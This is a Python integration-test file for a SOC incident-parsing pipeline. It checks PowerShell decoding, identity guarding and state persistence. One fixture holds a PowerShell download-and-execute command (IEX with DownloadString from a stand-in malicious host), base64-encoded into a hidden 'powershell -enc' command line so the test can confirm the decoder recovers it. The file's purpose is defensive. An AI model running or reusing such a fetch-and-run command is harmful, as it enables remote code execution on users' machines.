"""Integration coverage for the full Parsing & Normalisation pipeline:

    raw incident
      -> parser_context_guard input-identity fingerprint
      -> agents.parsing.parser_normaliser (extraction/normalisation)
      -> powershell_decoder (when applicable)
      -> parser_context_guard output-identity check
      -> workflow/engine.py persistence (parsing_result_json)
      -> reload from the state store

This is where the originally-reported "workflow did not publish a run
identity" bug lived, and where a later gap (parser output identity was
never actually checked on the live web path) was found and fixed. These
tests exercise the REAL run_until_triage_approval()/run_parsing() code
path -- only the live NetWitness network enrichment call is stubbed out,
so the actual parser (agents/parsing/parser_normaliser.py, including its
parser_context_guard and powershell_decoder wiring) runs unmodified."""
from __future__ import annotations

import base64
import json
from pathlib import Path

import pytest

from workflow import engine as sw
from workflow import state_store as wss
import agents.parsing.parser_normaliser as pn


@pytest.fixture(autouse=True)
def _isolated_workflow(tmp_path, monkeypatch):
    monkeypatch.setattr(wss, "DB_FILE", tmp_path / "workflow.db")
    monkeypatch.setattr(sw, "PIPELINE_DB_FILE", tmp_path / "pipeline.db")
    monkeypatch.setattr(sw, "_TRUSTED_OUTPUT_ROOT", tmp_path / "artifacts")
    monkeypatch.setattr(sw, "enrich_incident_with_apiretrieval_fetch",
                         lambda incident, host=None, token=None: incident)
    wss.db_init()


def _encode(command: str) -> str:
    return base64.b64encode(command.encode("utf-16le")).decode()


MALICIOUS_COMMAND = (
    "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')"
)


def _representative_incident(incident_id: str = "INC-INTEGRATION-1") -> dict:
    # Flat NetWitness incident shape -- matches the real, production
    # raw_json a case row actually carries (see commands.py::_raw_incident,
    # and backend/services/case_service.py::get_case_raw against the real
    # demo DB): id/title directly at the top level, no {"incident":...,
    # "alerts":[...]} wrapper. run_until_triage_approval() reads inc_id/
    # title straight off this dict, so the fixture must be shaped this way
    # for the *workflow* layer -- the parser itself tolerates either shape.
    return {
        "id": incident_id,
        "title": "Suspicious PowerShell Execution",
        "priority": "High",
        "severity": 92,
        "originalAlert": {"events": [{
            "ip_src": "10.0.0.5", "ip_dst": "8.8.8.8", "username": "jdoe",
            "alias_host": "WIN-HOST-1", "checksum_src": "d41d8cd98f00b204e9800998ecf8427e",
            "filename_src": "powershell.exe",
            "param_src": f"powershell.exe -nop -w hidden -enc {_encode(MALICIOUS_COMMAND)}",
        }]},
    }


def test_full_parsing_pipeline_persists_real_parser_output_and_reloads():
    incident = _representative_incident()
    ctx = sw.run_until_triage_approval(incident, allow_retry=False, parsing_only=True)

    assert ctx["stages"]["parsing"] == "completed"
    run_id = ctx["run_id"]
    assert run_id

    # --- reload, exactly as the case page does on refresh ---------------
    state = wss.get_state("INC-INTEGRATION-1")
    assert state["parsing_status"] == "Complete"
    assert state["workflow_status"] == "Awaiting Action"
    assert state["run_id"] == run_id

    persisted = json.loads(state["parsing_result_json"])
    assert persisted["run_id"] == run_id

    # Real structured parser output survived persistence + reload, not a
    # thin status-only summary.
    normalised = persisted["normalised_alert"]
    assert normalised["alert_summary"]["alert_id"] == "INC-INTEGRATION-1"
    assert "10.0.0.5" in normalised["network_indicators"]["source_ips"]

    # PowerShell decoding genuinely ran as part of the pipeline.
    assert normalised["powershell_analysis"]["decode_status"] == "success"
    assert MALICIOUS_COMMAND in normalised["powershell_analysis"]["decoded_commands"]

    # The parsing package's own identity guard ran and passed.
    assert persisted["identity_validation"]["passed"] is True
    assert persisted["input_identity"]["alert_id"] == "INC-INTEGRATION-1"

    # Downstream-facing processed_alert also present and consistent.
    assert persisted["processed_alert"]["powershell_decode_status"] == "success"


def test_full_parsing_pipeline_rejects_stale_parser_output(monkeypatch):
    """If the canonical parser ever returned output for the wrong alert
    (e.g. a caching/selection bug), parser_context_guard must catch it and
    the workflow must record a real Failed status + last_error -- never a
    false 'Complete' with mismatched data, and never the generic missing-
    run-identity error from an unrelated part of the stack."""
    real_build_standard_alert = pn.build_standard_alert

    def poisoned_build_standard_alert(data, output_dir="outputs"):
        out = real_build_standard_alert(data, output_dir=output_dir)
        if out.get("normalised_alert"):
            out["normalised_alert"] = dict(out["normalised_alert"])
            out["normalised_alert"]["alert_summary"] = dict(out["normalised_alert"]["alert_summary"])
            out["normalised_alert"]["alert_summary"]["alert_id"] = "ALERT-STALE-FROM-ANOTHER-RUN"
        if out.get("parser_summary"):
            out["parser_summary"] = dict(out["parser_summary"])
            out["parser_summary"]["important_extracted_fields"] = dict(
                out["parser_summary"]["important_extracted_fields"])
            out["parser_summary"]["important_extracted_fields"]["alert_id"] = "ALERT-STALE-FROM-ANOTHER-RUN"
            out["parser_summary"]["selected_alert_id"] = "ALERT-STALE-FROM-ANOTHER-RUN"
        out["selected_alert_id"] = "ALERT-STALE-FROM-ANOTHER-RUN"
        return out

    monkeypatch.setattr(pn, "build_standard_alert", poisoned_build_standard_alert)

    incident = _representative_incident("INC-INTEGRATION-2")
    ctx = sw.run_until_triage_approval(incident, allow_retry=False, parsing_only=True)

    assert ctx["stages"]["parsing"] == "failed"
    state = wss.get_state("INC-INTEGRATION-2")
    assert state["parsing_status"] == "Failed"
    assert state["workflow_status"] == "Failed"
    # The stale output must never be persisted as if it were valid.
    assert state["parsing_result_json"] is None
    # The real failure reason from the guard, not a generic/misleading one.
    assert state["last_error"] is not None
    assert "does not match" in state["last_error"] or "mismatch" in state["last_error"].lower()


def test_bare_incident_list_record_persists_real_network_evidence_and_reloads():
    """Regression for the INC-53027 bug: a bare NetWitness incident-list
    record (no "alerts"/"events" array, only incident-level alertMeta --
    the real shape every case in the demo DB actually has) must persist
    its genuine SourceIp/DestinationIp evidence as network_indicators,
    not silently collapse to an all-empty "generic" result."""
    incident = {
        "id": "INC-INTEGRATION-3",
        "title": "High Risk Alerts: ESA for 192.168.10.210",
        "priority": "High",
        "riskScore": 70,
        "alertMeta": {"SourceIp": ["192.168.10.210"], "DestinationIp": ["188.40.170.197"]},
    }
    ctx = sw.run_until_triage_approval(incident, allow_retry=False, parsing_only=True)

    assert ctx["stages"]["parsing"] == "completed"
    state = wss.get_state("INC-INTEGRATION-3")
    assert state["parsing_status"] == "Complete"

    persisted = json.loads(state["parsing_result_json"])
    normalised = persisted["normalised_alert"]
    assert normalised["observed_data_context"]["primary_data_source"] == "network"
    assert normalised["network_indicators"]["source_ips"] == ["192.168.10.210"]
    assert normalised["network_indicators"]["destination_ips"] == ["188.40.170.197"]

    # No fabricated sections for evidence that genuinely doesn't exist.
    assert "user_and_host_indicators" not in normalised
    assert "process_indicators" not in normalised
    assert "normalised_events" not in normalised
